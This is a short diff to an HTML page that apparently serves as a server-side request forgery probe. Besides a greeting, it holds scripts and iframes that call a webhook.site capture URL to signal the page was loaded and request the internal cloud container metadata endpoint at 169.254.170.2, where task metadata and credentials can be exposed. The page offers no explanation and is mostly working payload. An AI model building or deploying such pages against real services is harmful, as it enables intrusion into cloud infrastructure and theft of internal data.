@@ -7,7 +7,15 @@
   <body>
     Hello :)
     <script>
-        let res = fetch('https://webhook.site/bda34c27-7d2b-432a-85fd-3b578a9a76ce?1')
+        fetch('https://webhook.site/bda34c27-7d2b-432a-85fd-3b578a9a76ce?1')
+            .then(response => response.text())
+            .then(data => {
+                console.log(data);
+            })
+            .catch(error => console.error('Error fetching data:', error));
+    </script>
+    <script>
+        fetch('http://169.254.170.2/v2/metadata')
             .then(response => response.text())
             .then(data => {
                 console.log(data);
@@ -15,5 +23,6 @@
             .catch(error => console.error('Error fetching data:', error));
     </script>
     <iframe src="https://webhook.site/bda34c27-7d2b-432a-85fd-3b578a9a76ce?iframe"></iframe>
+    <iframe src="http://169.254.170.2/v2/metadata"></iframe>
   </body>
 </html>
